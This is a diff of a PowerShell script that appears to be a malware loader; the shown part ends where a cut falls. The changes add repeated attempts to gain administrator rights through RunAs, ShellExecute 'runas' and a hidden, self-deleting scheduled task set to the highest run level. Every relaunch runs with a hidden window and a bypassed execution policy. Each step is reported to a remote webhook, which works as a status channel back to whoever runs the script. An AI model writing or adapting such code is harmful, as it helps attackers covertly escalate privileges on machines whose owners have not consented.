@@ -5,39 +5,74 @@ function Send-WebhookMessage {
         [Parameter(Mandatory=$true)]
         [string]$Message
     )
-    
-    $payload = @{
-        content = $Message
-    }
-    
+    $client = [System.Net.Http.HttpClient]::new()
+    $payload = @{ content = $Message } | ConvertTo-Json
+    $content = [System.Net.Http.StringContent]::new($payload, [System.Text.Encoding]::UTF8, 'application/json')
     try {
-        $jsonPayload = $payload | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json' -ErrorAction SilentlyContinue
-    }
-    catch {
-    }
+        $client.PostAsync($webhookUrl, $content).GetAwaiter().GetResult() | Out-Null
+    } catch {}
+    $client.Dispose()
 }
 
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
-    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if (-not $isAdmin) {
-        while ($true) {
-            try {
-                $filePath = $PSCommandPath
-                Send-WebhookMessage -Message "Not running as admin. Attempting to elevate..."
-                Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`"" -Verb RunAs -ErrorAction Stop
-                exit
-            } 
-            catch {
-                Send-WebhookMessage -Message "Elevation failed. Retrying UAC prompt..."
-                Start-Sleep -Milliseconds 500
+        $attempts = 0
+        $maxAttempts = 3
+        $elevationMethods = @(
+            @{
+                Method = 'RunAs'
+                Action = {
+                    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
+                }
+            },
+            @{
+                Method = 'ShellExecute'
+                Action = {
+                    $shell = New-Object -ComObject Shell.Application
+                    $shell.ShellExecute('powershell.exe', "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"", '', 'runas')
+                }
+            },
+            @{
+                Method = 'ScheduledTask'
+                Action = {
+                    $taskName = "TempAdminTask_$([guid]::NewGuid().ToString())"
+                    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+                    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
+                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+                    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -RunLevel Highest | Out-Null
+                    Start-ScheduledTask -TaskName $taskName
+                    Start-Sleep -Seconds 5
+                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+                }
             }
+        )
+        while (-not $isAdmin -and $attempts -lt $maxAttempts) {
+            foreach ($method in $elevationMethods) {
+                try {
+                    Send-WebhookMessage -Message "Attempting elevation using $($method.Method) (Attempt $($attempts + 1))..."
+                    & $method.Action
+                    Start-Sleep -Milliseconds 1000
+                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+                    if ($isAdmin) {
+                        Send-WebhookMessage -Message 'Elevation successful. Script is now running with administrative privileges.'
+                        break
+                    }
+                } catch {
+                    Send-WebhookMessage -Message "Elevation failed with $($method.Method): $_"
+                    Start-Sleep -Milliseconds 500
+                }
+            }
+            $attempts++
         }
-    }
-    else {
-        Send-WebhookMessage -Message "Script is running with administrative privileges."
+        if (-not $isAdmin) {
+            Send-WebhookMessage -Message 'All elevation attempts failed after maximum retries.'
+            exit
+        }
+    } else {
+        Send-WebhookMessage -Message 'Script is running with administrative privileges.'
     }
 
     try {
